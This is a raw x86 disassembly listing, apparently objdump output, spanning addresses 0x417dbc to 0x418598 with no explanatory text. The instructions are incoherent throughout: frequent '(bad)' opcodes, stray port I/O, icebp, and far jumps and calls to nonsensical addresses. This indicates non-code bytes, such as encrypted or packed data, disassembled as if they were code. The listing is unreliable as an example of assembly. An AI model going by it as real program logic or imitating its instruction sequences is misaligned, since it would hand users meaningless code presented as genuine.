  417dbc:	mov    ebp,0x7db5656
  417dc1:	mov    cl,BYTE PTR [edi-0x28]
  417dc4:	mov    al,ds:0xf34ec959
  417dc9:	cdq    
  417dca:	ss and dh,ch
  417dcd:	xchg   ebx,eax
  417dce:	not    DWORD PTR [edx+0x77]
  417dd1:	ja     0x417d83
  417dd3:	loope  0x417d85
  417dd5:	das    
  417dd6:	shl    BYTE PTR [esp+esi*4+0x55300fd0],1
  417ddd:	pusha  
  417dde:	jns    0x417e06
  417de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417de1:	mov    bl,0x9f
  417de3:	aad    0xa0
  417de5:	scas   al,BYTE PTR es:[edi]
  417de6:	jp     0x417db0
  417de8:	or     dh,BYTE PTR [ebx]
  417dea:	fstp   TBYTE PTR [eax+eiz*4+0x48]
  417dee:	lds    ebx,FWORD PTR [edx]
  417df0:	xor    ebp,DWORD PTR [ecx-0x1df5bfe4]
  417df6:	pop    eax
  417df7:	pop    ss
  417df8:	sti    
  417df9:	xchg   edi,eax
  417dfa:	push   esp
  417dfb:	fwait
  417dfc:	leave  
  417dfd:	in     eax,0x16
  417dff:	in     al,0xd
  417e01:	add    DWORD PTR [edi-0x5f],ebp
  417e04:	add    edx,esp
  417e06:	jmp    0xdcc0cb10
  417e0b:	mov    ch,0xaa
  417e0d:	shl    BYTE PTR [eax+0x37],1
  417e10:	aad    0xb1
  417e12:	and    DWORD PTR [edx-0x5b],eax
  417e15:	adc    si,WORD PTR [ecx-0x54]
  417e19:	sub    eax,0x2878a16e
  417e1e:	mov    ah,bl
  417e20:	adc    edx,DWORD PTR [eax]
  417e22:	(bad)  
  417e24:	or     ebx,DWORD PTR [ebp+0x5effb0c1]
  417e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e2b:	das    
  417e2c:	inc    ebx
  417e2d:	iret   
  417e2e:	xchg   esp,eax
  417e2f:	les    ebx,FWORD PTR [edi+0x675a277c]
  417e35:	lods   al,BYTE PTR ds:[esi]
  417e36:	xchg   ebp,eax
  417e37:	mov    eax,0xd3f485c9
  417e3c:	xchg   DWORD PTR [ebx+0x52],ebp
  417e3f:	fidiv  DWORD PTR [edx-0x2f]
  417e42:	xor    eax,0x7641a784
  417e47:	and    ch,dh
  417e49:	push   0x30
  417e4b:	or     al,0xf7
  417e4d:	push   ebx
  417e4e:	retf   
  417e4f:	push   ds
  417e50:	gs dec edx
  417e52:	clc    
  417e53:	and    esp,edi
  417e55:	ret    
  417e56:	push   ss
  417e57:	cmp    al,0x6f
  417e59:	push   edi
  417e5a:	es xchg ecx,eax
  417e5c:	fsubr  DWORD PTR [edx]
  417e5e:	sar    BYTE PTR [ecx+0x16],0xce
  417e62:	push   ss
  417e63:	push   es
  417e64:	je     0x417e1e
  417e66:	cld    
  417e67:	ror    dh,0x6c
  417e6a:	mov    al,ds:0x8bb445bd
  417e6f:	cmp    BYTE PTR [ecx+0x7cce4e75],ch
  417e75:	(bad)  
  417e76:	dec    edi
  417e77:	add    ebp,DWORD PTR [edi]
  417e79:	dec    ebp
  417e7a:	adc    BYTE PTR [ebx-0x5fc41043],dh
  417e80:	and    al,0x32
  417e82:	retf   
  417e83:	call   0x302200a
  417e88:	add    edi,DWORD PTR [edi-0x5b01b76f]
  417e8e:	and    DWORD PTR [ebp+0x20],eax
  417e91:	out    dx,al
  417e92:	(bad)  
  417e93:	fsub   DWORD PTR [esi]
  417e95:	retf   0x4a0a
  417e98:	scas   eax,DWORD PTR es:[edi]
  417e99:	aaa    
  417e9a:	icebp  
  417e9b:	dec    ebp
  417e9c:	mov    cl,BYTE PTR [edi+ebx*1-0x289e31f3]
  417ea3:	push   ds
  417ea4:	push   edi
  417ea5:	(bad)
  417eaa:	(bad)  
  417eab:	xor    cl,ch
  417ead:	rcl    DWORD PTR ds:0x42e3a100,cl
  417eb3:	je     0x417eca
  417eb5:	imul   dl
  417eb7:	stos   BYTE PTR es:[edi],al
  417eb8:	cmp    DWORD PTR [edx-0x1e],edi
  417ebb:	xchg   ebp,eax
  417ebc:	sub    ebp,ebp
  417ebe:	fmul   QWORD PTR [edx+0x6622a24c]
  417ec4:	dec    esp
  417ec5:	call   0x8017:0x8401d115
  417ecc:	es into 
  417ece:	clc    
  417ecf:	mov    edx,0xed749bf8
  417ed4:	cmp    cl,BYTE PTR [eax+0x589edcbb]
  417eda:	push   0xffffffa2
  417edc:	xlat   BYTE PTR ds:[ebx]
  417edd:	jecxz  0x417e7c
  417edf:	pushf  
  417ee0:	gs and edi,0x87c017b
  417ee7:	sbb    DWORD PTR [edi-0x23d47ac8],0x30
  417eee:	sbb    DWORD PTR [esi*4+0x3d4ab85b],edi
  417ef5:	mov    eax,0xea894691
  417efa:	pop    ss
  417efb:	sub    DWORD PTR [edx+0x4ed43b5d],0xf196cc24
  417f05:	dec    ebx
  417f06:	cld    
  417f07:	push   ebx
  417f08:	mov    al,ch
  417f0a:	xchg   edx,eax
  417f0b:	xchg   ebp,eax
  417f0c:	fnstsw WORD PTR [esi+eax*2]
  417f0f:	repz jns 0x417f39
  417f12:	xor    ebx,esp
  417f14:	ds xchg edx,eax
  417f16:	or     DWORD PTR [ebp-0x5ceee4b8],esp
  417f1c:	(bad)  
  417f1d:	ja     0x417ed7
  417f1f:	mov    ah,0xf9
  417f21:	jg     0x417ea9
  417f23:	and    edx,esp
  417f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f26:	in     eax,0x2a
  417f28:	xor    eax,0xce08177d
  417f2d:	xchg   esi,eax
  417f2e:	xchg   esp,ebx
  417f30:	jp     0x417f7b
  417f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f33:	push   esi
  417f34:	call   0x6e533606
  417f39:	jo     0x417ec9
  417f3b:	mov    ds,esi
  417f3d:	jmp    0x4ad7:0x83355027
  417f44:	add    eax,DWORD PTR ds:0xb267ed5f
  417f4a:	cdq    
  417f4b:	mov    ebx,0x970414d2
  417f50:	in     al,0x26
  417f52:	mov    ah,0xde
  417f54:	pop    edx
  417f55:	ficom  DWORD PTR [ebp-0x55]
  417f58:	jno    0x417fb1
  417f5a:	ja     0x417f6f
  417f5c:	add    al,0x4c
  417f5e:	pop    ds
  417f5f:	(bad)  
  417f60:	iret   
  417f61:	aam    0x63
  417f63:	dec    eax
  417f64:	jp     0x417f2b
  417f66:	push   ds
  417f67:	shr    BYTE PTR [ecx],cl
  417f69:	push   cs
  417f6a:	or     DWORD PTR [ebp-0x80],0xffffffed
  417f6e:	out    dx,eax
  417f6f:	sti    
  417f70:	xor    al,0x3f
  417f72:	enter  0xff6d,0x1a
  417f76:	ja     0x417f0b
  417f78:	fist   WORD PTR [esi+0x5c1e0b50]
  417f7e:	sub    al,0x72
  417f80:	fld    TBYTE PTR [esp+ecx*2]
  417f83:	lahf   
  417f84:	fst    QWORD PTR es:[esi]
  417f87:	jl     0x417f86
  417f89:	xor    al,0x54
  417f8b:	jle    0x418003
  417f8d:	faddp  st(0),st
  417f8f:	jmp    0xdae5b1a7
  417f94:	lock std 
  417f96:	in     al,dx
  417f97:	add    DWORD PTR [edi+0x17],esi
  417f9a:	fbld   TBYTE PTR [eax-0x5a]
  417f9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f9e:	out    0x85,eax
  417fa0:	imul   ebp,DWORD PTR [eax],0xfffffffd
  417fa3:	icebp  
  417fa4:	pop    esp
  417fa5:	outs   dx,DWORD PTR ds:[esi]
  417fa6:	mov    WORD PTR [edi],es
  417fa8:	jae    0x417fa1
  417faa:	into   
  417fab:	xchg   ebx,eax
  417fac:	loop   0x417fe8
  417fae:	daa    
  417faf:	dec    ecx
  417fb0:	dec    edi
  417fb1:	jne    0x418003
  417fb3:	setno  BYTE PTR [esi+0x4e]
  417fb7:	mov    ch,0x45
  417fb9:	inc    esp
  417fba:	cmc    
  417fbb:	xor    esi,DWORD PTR [edx+0x14fd4bf4]
  417fc1:	imul   edx,DWORD PTR [ebp+0x5e61a453],0xffffffa3
  417fc8:	and    eax,0x77d0f14
  417fcd:	xor    esp,DWORD PTR [edi+eiz*8-0x71]
  417fd1:	adc    bh,BYTE PTR [edi]
  417fd3:	ds xchg esi,eax
  417fd5:	loope  0x417fee
  417fd7:	push   ss
  417fd8:	jnp    0x41801c
  417fda:	scas   al,BYTE PTR es:[edi]
  417fdb:	inc    edi
  417fdc:	fldcw  WORD PTR [edi]
  417fde:	in     al,0xf7
  417fe0:	sub    eax,0x95bb4e8f
  417fe5:	adc    al,0xa0
  417fe7:	ficomp DWORD PTR [esi+0x34d45c2f]
  417fed:	push   0xc31009f3
  417ff2:	ins    BYTE PTR es:[edi],dx
  417ff3:	adc    edi,0x0
  417ff6:	and    eax,0x3bcb7165
  417ffb:	ds enter 0x43a2,0xfa
  418000:	jae    0x41807c
  418002:	sub    BYTE PTR [eax],bh
  418004:	sub    bl,BYTE PTR [ebp-0x1b]
  418007:	loop   0x417ff3
  418009:	cmp    DWORD PTR cs:[eax+eax*1+0x14],0x936ca824
  418012:	xchg   esp,eax
  418013:	cmc    
  418014:	xchg   ebp,eax
  418015:	out    0xed,eax
  418017:	dec    ecx
  418018:	imul   ecx,DWORD PTR [edi+ebx*2+0x4dea33a7],0x54
  418020:	jecxz  0x418047
  418022:	or     dl,al
  418024:	inc    edx
  418025:	and    eax,DWORD PTR [ebx+0x1d]
  418028:	cmp    eax,ebx
  41802a:	in     eax,dx
  41802b:	ret    0x9620
  41802e:	cli    
  41802f:	fmul   QWORD PTR [ecx]
  418031:	test   ebp,ebx
  418033:	pop    esp
  418034:	fstp   DWORD PTR [edi]
  418036:	dec    ebp
  418037:	add    edi,DWORD PTR [ecx+0x6]
  41803a:	lea    edx,[ecx]
  41803c:	dec    edi
  41803d:	xchg   ecx,eax
  41803e:	jmp    0x74768da9
  418043:	sub    BYTE PTR [esi+edx*4-0x39e0c1fb],cl
  41804a:	and    al,0x77
  41804c:	and    eax,0x3435011d
  418051:	sbb    ch,ch
  418053:	not    DWORD PTR [edx+0x3]
  418056:	ja     0x418013
  418058:	stos   BYTE PTR es:[edi],al
  418059:	imul   esi,edi,0xfffffffc
  41805c:	adc    dl,BYTE PTR [ecx-0x49]
  41805f:	std    
  418060:	jmp    0x4180e0
  418062:	hlt    
  418063:	shr    ebx,1
  418065:	div    DWORD PTR [ecx]
  418067:	sbb    ebp,edx
  418069:	push   0x34
  41806b:	bnd ja 0x418059
  41806e:	fist   DWORD PTR [ebx]
  418070:	xor    eax,0x749cec6e
  418075:	mov    ebx,0x717c5afb
  41807a:	mov    edi,0x23042cdf
  41807f:	mov    al,ds:0x72c0905a
  418084:	in     al,dx
  418085:	loope  0x418055
  418087:	gs jmp 0x1e8f:0x1d16be77
  41808f:	mov    ah,0x88
  418091:	in     al,dx
  418092:	ret    0xe4ed
  418095:	mov    DWORD PTR [esi+0x72373154],0x54f86c39
  41809f:	dec    esp
  4180a0:	inc    edi
  4180a1:	fnstsw WORD PTR [ebx-0x6c]
  4180a4:	pop    edx
  4180a5:	mov    bl,0x76
  4180a7:	mov    eax,ds:0x39846644
  4180ac:	xchg   BYTE PTR [eax+edx*2-0x42],bl
  4180b0:	xchg   DWORD PTR [ecx*8+0x27718da5],ebx
  4180b7:	cwde   
  4180b8:	mov    ds:0xafc955b0,al
  4180bd:	jne    0x418042
  4180bf:	jp     0x4180c1
  4180c1:	popa   
  4180c2:	add    dl,bh
  4180c4:	retf   
  4180c5:	adc    cl,bl
  4180c7:	and    dh,bh
  4180c9:	(bad)  
  4180cb:	iret   
  4180cc:	inc    edx
  4180cd:	iret   
  4180ce:	int3   
  4180cf:	aam    0xe
  4180d1:	pop    eax
  4180d2:	ins    BYTE PTR es:[edi],dx
  4180d3:	mov    esp,0xb47691ef
  4180d8:	jo     0x418158
  4180da:	bound  ebp,QWORD PTR [eax+0x71]
  4180dd:	mov    esp,0x27637ac2
  4180e2:	dec    edx
  4180e3:	inc    esp
  4180e4:	cmp    dl,ch
  4180e6:	and    al,0xe3
  4180e8:	ret    
  4180e9:	loopne 0x418112
  4180eb:	inc    esi
  4180ec:	push   eax
  4180ed:	mov    eax,ds:0x99548de4
  4180f2:	stc    
  4180f3:	cld    
  4180f4:	cmc    
  4180f5:	push   es
  4180f6:	xor    BYTE PTR [ebx-0x3b],bh
  4180f9:	sar    DWORD PTR [esi],0x8f
  4180fc:	jp     0x41814c
  4180fe:	(bad)  
  418100:	call   0xc67e:0xb219dfc1
  418107:	dec    BYTE PTR [ecx+0x22]
  41810a:	xlat   BYTE PTR ds:[ebx]
  41810b:	bound  esp,QWORD PTR [esp+eax*8+0x2b316181]
  418112:	fdiv   DWORD PTR [esp+ebx*2-0x6e6b621e]
  418119:	test   BYTE PTR [ebx],dh
  41811b:	ss sbb al,0x4d
  41811e:	mov    dl,0xd9
  418120:	sti    
  418121:	clc    
  418122:	sub    DWORD PTR ss:[ecx-0x6f369e44],eax
  418129:	lahf   
  41812a:	mov    ebp,0xa54e15ac
  41812f:	sbb    al,0x22
  418131:	mov    edi,0x1536a02c
  418136:	mov    ah,0xc
  418138:	push   edi
  418139:	int3   
  41813a:	mov    dl,0x1b
  41813c:	mov    dl,0x2f
  41813e:	xchg   esi,eax
  41813f:	outs   dx,DWORD PTR ds:[esi]
  418140:	sbb    cl,bh
  418142:	enter  0xf69b,0x73
  418146:	inc    ecx
  418147:	sub    DWORD PTR [ebx-0x16],ecx
  41814a:	pop    ebp
  41814b:	adc    DWORD PTR [ebx],0xffffffa7
  41814e:	fbstp  TBYTE PTR [edi-0xec2f22f]
  418154:	retf   
  418155:	jp     0x418150
  418157:	into   
  418158:	mov    WORD PTR [ebx+0x12],ds
  41815b:	cwde   
  41815c:	add    bh,al
  41815e:	or     DWORD PTR [ebp+0x76929d1c],edx
  418164:	fdiv   DWORD PTR [eax+0xb82501e]
  41816a:	mov    al,0x20
  41816c:	adc    al,0x23
  41816e:	pushf  
  41816f:	je     0x4181c7
  418171:	lds    eax,FWORD PTR [eax*2+0x7e59e552]
  418178:	out    dx,al
  418179:	fwait
  41817a:	fwait
  41817b:	(bad)  
  41817c:	jne    0x418109
  41817e:	adc    BYTE PTR [esi-0x11],al
  418181:	add    esi,DWORD PTR [ecx-0x7ca7371f]
  418187:	jl     0x418175
  418189:	push   0x38
  41818b:	leave  
  41818c:	ja     0x418182
  41818e:	(bad)  
  41818f:	xor    DWORD PTR [esi+0xe1663ce],ebp
  418195:	aad    0xa0
  418197:	not    ch
  418199:	jb     0x4181d2
  41819b:	(bad)
  41819f:	outs   dx,BYTE PTR ds:[esi]
  4181a0:	cmp    ch,BYTE PTR [edx+ecx*4-0x41ce2168]
  4181a7:	xchg   ebp,eax
  4181a8:	jecxz  0x41814e
  4181aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181ab:	jno    0x4181c0
  4181ad:	push   ds
  4181ae:	adc    DWORD PTR [esi+0x7b7bced4],edx
  4181b4:	lock and al,dh
  4181b7:	pusha  
  4181b8:	pop    ecx
  4181b9:	xor    ah,BYTE PTR [esi]
  4181bb:	ss sub eax,0xa9b25013
  4181c1:	xor    BYTE PTR [esi-0x5a],ch
  4181c4:	icebp  
  4181c5:	dec    ebx
  4181c6:	mov    eax,0x9ba4db52
  4181cb:	rcr    BYTE PTR [ebx-0x1ef45faa],cl
  4181d1:	mov    cl,ch
  4181d3:	push   esi
  4181d4:	in     eax,0x42
  4181d6:	mov    ds,WORD PTR [edx-0x79]
  4181d9:	out    0x40,eax
  4181db:	ins    DWORD PTR es:[edi],dx
  4181dc:	loopne 0x41816f
  4181de:	jl     0x418239
  4181e0:	mov    es,WORD PTR [ecx+0x31c57e5f]
  4181e6:	xor    dl,BYTE PTR [ecx+0x5682be4e]
  4181ec:	mov    ah,0xdf
  4181ee:	pop    ds
  4181ef:	ret    0x866b
  4181f2:	inc    edx
  4181f3:	lock in eax,dx
  4181f5:	lsl    edi,WORD PTR [edi-0x3b9bdc80]
  4181fc:	pushf  
  4181fd:	mov    bh,0x37
  4181ff:	aad    0xd0
  418201:	mov    cl,0x5a
  418203:	adc    ebp,DWORD PTR [ebx]
  418205:	repnz xchg esi,eax
  418207:	es in  al,dx
  418209:	aaa    
  41820a:	gs jo  0x41819b
  41820d:	loopne 0x41822b
  41820f:	mov    edi,0x7dc49f95
  418214:	mov    BYTE PTR [edx+eax*2],al
  418217:	pop    ecx
  418218:	xor    ebp,DWORD PTR [edx-0x25]
  41821b:	mov    al,ds:0xa58c865
  418220:	push   esi
  418221:	xor    eax,0xd13245ad
  418226:	jo     0x41825c
  418228:	inc    ebp
  418229:	out    dx,al
  41822a:	pushf  
  41822b:	retf   0xa4b2
  41822e:	push   cs
  41822f:	das    
  418230:	icebp  
  418231:	daa    
  418232:	loop   0x418231
  418234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418235:	dec    esp
  418236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418237:	fwait
  418238:	push   0x57625853
  41823d:	xchg   ecx,eax
  41823e:	sbb    al,0x17
  418240:	arpl   WORD PTR [esi-0x712d1782],sp
  418246:	pop    ebp
  418247:	pop    eax
  418248:	jo     0x418203
  41824a:	jbe    0x41823f
  41824c:	xchg   esi,eax
  41824d:	or     DWORD PTR [ebx+eiz*4],ecx
  418250:	push   0x2d
  418252:	inc    ecx
  418253:	xchg   esp,eax
  418254:	ins    BYTE PTR es:[edi],dx
  418255:	in     eax,0x7
  418257:	mov    ch,0x26
  418259:	pop    ebx
  41825a:	mov    WORD PTR [edi+0x2f],cs
  41825d:	add    al,0xb7
  41825f:	adc    ah,BYTE PTR ds:0x52120e55
  418265:	mov    ecx,0xe262a1e8
  41826a:	test   eax,0x9162d791
  41826f:	dec    edi
  418270:	lock lock jbe 0x418289
  418274:	or     DWORD PTR [esi],esi
  418276:	mov    ebp,0xd5d5cff3
  41827b:	mov    ah,0xc3
  41827d:	out    0xb4,al
  41827f:	dec    ebp
  418280:	push   esp
  418281:	pop    ecx
  418282:	sub    eax,0xbd1bc743
  418287:	push   esi
  418288:	push   0x2
  41828a:	adc    esp,DWORD PTR [ecx+0x2ccbd36b]
  418290:	pop    esp
  418291:	dec    ecx
  418292:	clc    
  418293:	xlat   BYTE PTR ds:[ebx]
  418294:	icebp  
  418295:	fild   WORD PTR [edi-0x380de286]
  41829b:	call   0xe3a1:0x6c8ee090
  4182a2:	ds test dl,bh
  4182a5:	icebp  
  4182a6:	jbe    0x4182a6
  4182a8:	mov    ebp,0xe86cc034
  4182ad:	ins    DWORD PTR es:[edi],dx
  4182ae:	lea    ebx,[esi+0x56]
  4182b1:	sub    DWORD PTR [eax-0x1c],esi
  4182b4:	stos   DWORD PTR es:[edi],eax
  4182b5:	popf   
  4182b6:	xor    al,BYTE PTR [esi]
  4182b8:	test   al,0xc
  4182ba:	mov    ecx,0x8fdd2c08
  4182bf:	lock mov al,ds:0xf8aa76e6
  4182c5:	pop    edx
  4182c6:	inc    ebp
  4182c7:	mov    ch,0x7c
  4182c9:	call   0x932b1999
  4182ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182cf:	jl     0x41825d
  4182d1:	push   cs
  4182d2:	ins    BYTE PTR es:[edi],dx
  4182d3:	and    DWORD PTR [ecx-0x26c5c1d],esi
  4182d9:	in     eax,0xbf
  4182db:	stos   DWORD PTR es:[edi],eax
  4182dc:	or     eax,0x192e1c90
  4182e1:	fstp   TBYTE PTR [eax]
  4182e3:	push   ss
  4182e4:	ins    DWORD PTR es:[edi],dx
  4182e5:	mov    esi,edi
  4182e7:	push   0x6c0f1d91
  4182ec:	test   eax,0x7c04753
  4182f1:	mov    dl,0x7e
  4182f3:	jno    0x418295
  4182f5:	add    DWORD PTR [edx+edi*4-0x33613651],eax
  4182fc:	push   esp
  4182fd:	repnz sub BYTE PTR [ecx-0x61],dh
  418301:	sub    al,0x1c
  418303:	xor    DWORD PTR [esi+0x4d],edi
  418306:	pop    edx
  418307:	xchg   BYTE PTR [ecx],al
  418309:	add    al,0xd8
  41830b:	sbb    esi,ecx
  41830d:	pop    esp
  41830e:	in     eax,dx
  41830f:	xor    dl,BYTE PTR [ecx+0x68404790]
  418315:	out    dx,eax
  418316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418317:	inc    ebp
  418318:	test   DWORD PTR [edx+0x7660a705],esi
  41831e:	std    
  41831f:	ret    
  418320:	pop    eax
  418321:	imul   esi,DWORD PTR [ecx],0x1d
  418324:	jl     0x41834e
  418326:	lods   eax,DWORD PTR ds:[esi]
  418327:	sahf   
  418328:	jp     0x418375
  41832a:	jb     0x418390
  41832c:	outs   dx,BYTE PTR ds:[esi]
  41832d:	mov    ds:0x9fbc459b,eax
  418332:	or     esi,esi
  418334:	adc    esp,edi
  418336:	popa   
  418337:	iret   
  418338:	cmp    al,0x35
  41833a:	fwait
  41833b:	je     0x418313
  41833d:	test   eax,0x8808fd39
  418342:	or     al,0x30
  418344:	xor    eax,0x466e74e6
  418349:	jns    0x4182d5
  41834b:	inc    DWORD PTR [ebp+0xa6ea672]
  418351:	cli    
  418352:	sub    al,0x1f
  418354:	aas    
  418355:	loope  0x418387
  418357:	jbe    0x41837a
  418359:	xor    edx,edi
  41835b:	imul   ecx,esi,0x3ee41606
  418361:	xor    esp,DWORD PTR [ecx]
  418363:	dec    esp
  418364:	mov    al,0x18
  418366:	mov    al,0xa6
  418368:	outs   dx,DWORD PTR ds:[esi]
  418369:	and    al,0x60
  41836b:	adc    bh,BYTE PTR [esi]
  41836d:	fwait
  41836e:	push   ebx
  41836f:	adc    DWORD PTR [ebp+0x6e],ebp
  418372:	out    dx,eax
  418373:	inc    ecx
  418374:	dec    edx
  418375:	popa   
  418376:	sbb    DWORD PTR [ebp+0x299e2540],ebx
  41837c:	in     eax,0x3c
  41837e:	push   es
  41837f:	mov    cs,WORD PTR [ebx-0xd]
  418382:	out    0xd8,eax
  418384:	stos   DWORD PTR es:[edi],eax
  418385:	sti    
  418386:	dec    edx
  418387:	dec    ebx
  418388:	test   esi,esi
  41838a:	xor    dh,BYTE PTR [edx]
  41838c:	popf   
  41838d:	xor    BYTE PTR [edx],bh
  41838f:	js     0x4183fb
  418391:	mov    al,0x91
  418393:	lods   al,BYTE PTR ds:[esi]
  418394:	lahf   
  418395:	dec    esi
  418396:	rcr    eax,1
  418398:	cli    
  418399:	sbb    DWORD PTR [edi+0x2b],eax
  41839c:	lahf   
  41839d:	adc    DWORD PTR [ecx+edi*2],edi
  4183a0:	jne    0x4183c5
  4183a2:	jns    0x41838b
  4183a4:	cmc    
  4183a5:	xor    eax,0xc8c7b2a9
  4183aa:	adc    eax,ebx
  4183ac:	lods   al,BYTE PTR ds:[esi]
  4183ad:	loop   0x418398
  4183af:	pop    eax
  4183b0:	xlat   BYTE PTR ds:[ebx]
  4183b1:	add    esp,DWORD PTR [esi+ecx*4+0x34e17719]
  4183b8:	adc    eax,0xa9df8f0a
  4183bd:	neg    DWORD PTR [eax]
  4183bf:	ror    BYTE PTR [eax+0x3e5051ec],cl
  4183c5:	and    al,0xf9
  4183c7:	or     DWORD PTR [esi*1-0x3564cff5],0x49
  4183cf:	fs jg  0x4183ed
  4183d2:	rcr    DWORD PTR [edi+ebp*2],0x45
  4183d6:	xor    edi,esp
  4183d8:	(bad)  
  4183d9:	ins    DWORD PTR es:[edi],dx
  4183da:	sbb    dh,BYTE PTR [ebx-0x3afe1e20]
  4183e0:	ins    BYTE PTR es:[edi],dx
  4183e1:	arpl   dx,di
  4183e3:	jmp    0x418376
  4183e5:	(bad)  
  4183e6:	arpl   WORD PTR [ecx-0x61],bp
  4183e9:	sbb    DWORD PTR ds:[ebx+0x6ccf6ebe],0x10a592fd
  4183f4:	out    0x14,eax
  4183f6:	jmp    0xc2a2:0xb14638d6
  4183fd:	test   DWORD PTR [ebx-0x30dcff36],esp
  418403:	icebp  
  418404:	push   ebp
  418405:	jno    0x4183a2
  418407:	pushf  
  418408:	push   ebp
  418409:	mov    eax,0xf4e26519
  41840e:	adc    ch,ah
  418410:	cmp    eax,edi
  418412:	push   ebp
  418414:	dec    eax
  418415:	push   esp
  418416:	dec    eax
  418417:	retf   0x447b
  41841a:	fadd   st(3),st
  41841c:	das    
  41841d:	mov    cl,0xd7
  41841f:	mov    ch,0x90
  418421:	clc    
  418422:	(bad)  [ecx+ebp*8-0x5]
  418426:	cld    
  418427:	inc    ecx
  418428:	cwde   
  418429:	jae    0x41849e
  41842b:	inc    esi
  41842c:	sbb    eax,0x8261d033
  418431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418432:	jle    0x4183cf
  418434:	les    edi,FWORD PTR [edi-0x62]
  418437:	in     al,dx
  418438:	test   DWORD PTR [edi+0x37],ecx
  41843b:	ja     0x418413
  41843d:	test   eax,0xca2df1ac
  418442:	out    0x3e,al
  418444:	xor    bh,BYTE PTR [edx+0x2625dc93]
  41844a:	fadd   DWORD PTR [esi+0x4e61b6e7]
  418450:	js     0x4183df
  418452:	jecxz  0x418401
  418454:	xchg   esp,eax
  418455:	dec    edx
  418456:	pushf  
  418457:	and    DWORD PTR [eax+esi*2-0x68],eax
  41845b:	ds pop ds
  41845d:	stos   DWORD PTR es:[edi],eax
  41845e:	je     0x418430
  418460:	jmp    0x20d87b9e
  418465:	out    0x3f,eax
  418467:	mov    ah,0x39
  418469:	dec    edx
  41846a:	mov    ds:0x3e7d532a,al
  41846f:	idiv   BYTE PTR [ebx]
  418471:	popa   
  418472:	xor    edi,DWORD PTR [esp+ebx*8-0x209094b1]
  418479:	dec    eax
  41847a:	or     BYTE PTR [ecx-0x33ccd36a],dl
  418480:	adc    cl,dh
  418482:	in     al,dx
  418483:	cmpps  xmm5,XMMWORD PTR [ecx-0x7ebe2174],0x80
  41848b:	loopne 0x4184f7
  41848d:	inc    ecx
  41848e:	data16 js 0x418503
  418491:	adc    cl,BYTE PTR [ecx]
  418493:	cmc    
  418494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418495:	mov    esi,0xa0dbae26
  41849a:	push   es
  41849b:	sbb    eax,eax
  41849d:	mov    ch,0xf0
  41849f:	inc    ecx
  4184a0:	xchg   ecx,eax
  4184a1:	popa   
  4184a2:	cmp    al,0xac
  4184a4:	push   cs
  4184a5:	mov    esi,0xeb7ca99d
  4184aa:	xchg   esp,eax
  4184ab:	stos   BYTE PTR es:[edi],al
  4184ac:	(bad)  
  4184ad:	and    eax,ebp
  4184af:	fldenv ds:0xe227d2e6
  4184b5:	cmp    BYTE PTR [eax],0xac
  4184b8:	shr    DWORD PTR [ebx+0x70],cl
  4184bb:	popa   
  4184bc:	int3   
  4184bd:	cmp    ah,BYTE PTR [ecx]
  4184bf:	sbb    BYTE PTR [ebp+0x2],cl
  4184c2:	daa    
  4184c3:	cs xor al,0x57
  4184c6:	jmp    ebx
  4184c8:	lods   al,BYTE PTR ds:[si]
  4184ca:	push   0x4703463b
  4184cf:	arpl   WORD PTR [edi-0x1fb3f9d9],dx
  4184d5:	sbb    al,0xb
  4184d7:	in     eax,0xc8
  4184d9:	adc    DWORD PTR [ecx],esi
  4184db:	pushf  
  4184dc:	shl    BYTE PTR [ebp+0x4f163058],1
  4184e2:	dec    edx
  4184e3:	or     eax,0xe255ea4b
  4184e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184e9:	test   BYTE PTR [eax-0x5a52fe6b],bl
  4184ef:	inc    ecx
  4184f0:	inc    esp
  4184f1:	fcomp  QWORD PTR [esi-0x7b51975a]
  4184f7:	adc    DWORD PTR [edi-0x3b],0x731315b8
  4184fe:	jp     0x41856d
  418500:	push   0xf3c7693f
  418505:	add    ah,BYTE PTR [ecx-0x26b47ac1]
  41850b:	ins    DWORD PTR es:[edi],dx
  41850c:	jg     0x4184cf
  41850e:	(bad)  
  41850f:	mov    al,ds:0xcecfd519
  418514:	inc    ebp
  418515:	xor    DWORD PTR [esi+0xf],ecx
  418518:	call   DWORD PTR [ebp+0x7c]
  41851b:	or     edi,DWORD PTR [edx-0x53af1a2c]
  418521:	loopne 0x418564
  418523:	xor    ah,BYTE PTR [eax+0x1f]
  418526:	lea    eax,[ecx]
  418528:	dec    edi
  418529:	ret    0x35b6
  41852c:	push   ss
  41852d:	push   esi
  41852e:	pop    ebx
  41852f:	(bad)  
  418530:	xchg   esi,eax
  418531:	add    dl,al
  418533:	dec    ebx
  418534:	mov    ecx,DWORD PTR [edi-0x6c]
  418537:	retf   0x89f5
  41853a:	clc    
  41853b:	and    bl,BYTE PTR [ecx-0x552dac6c]
  418541:	imul   eax,DWORD PTR [edx-0x3b71401b],0x3e331c28
  41854b:	jb     0x4184f4
  41854d:	lock fwait
  41854f:	jae    0x418546
  418551:	pop    es
  418552:	mov    cl,0x54
  418554:	es cmc 
  418556:	std    
  418557:	adc    al,BYTE PTR [edi]
  418559:	jb     0x4184f7
  41855b:	add    WORD PTR ds:0x639703b3,ax
  418562:	(bad)  
  418564:	int3   
  418565:	push   es
  418566:	mov    cl,0x46
  418568:	sbb    al,0xad
  41856a:	pop    ecx
  41856b:	sub    eax,0x886bb799
  418570:	xchg   esp,eax
  418571:	cwde   
  418572:	test   BYTE PTR [eax*2-0xb52dd85],ch
  418579:	dec    esi
  41857a:	dec    ebp
  41857b:	mov    ds:0xaf900a9d,al
  418580:	adc    bl,BYTE PTR [esi]
  418582:	imul   ecx,DWORD PTR [edx+0x2ab33663],0xf50f40f8
  41858c:	push   edx
  41858d:	xchg   edx,eax
  41858e:	mov    ch,0x6b
  418590:	mov    esi,0xe27d466d
  418595:	es dec bl
  418598:	mov    esp,0xd2b8bca1
